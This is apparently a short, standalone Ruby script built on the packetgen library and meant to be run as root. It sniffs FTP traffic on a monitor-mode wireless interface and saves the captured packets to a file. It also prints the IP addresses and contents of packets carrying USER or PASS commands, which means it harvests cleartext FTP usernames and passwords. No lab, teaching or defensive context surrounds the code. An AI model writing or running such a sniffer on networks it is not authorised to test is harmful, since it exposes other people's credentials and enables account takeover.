#run as root 

require 'packetgen'

def main
    
    PacketGen.capture(iface: 'mon0', filter: 'port ftp or ftp-data', max: 1000) do |pkt|
        PacketGen.write('ftp-captured.pcapng', pkt)
    if pkt.tcp.body.include?("USER") || pkt.tcp.body.include?("PASS")
        puts pkt.ip.src + " -> " + pkt.ip.dst 
        puts pkt.tcp.body
    end
    end
end

main() 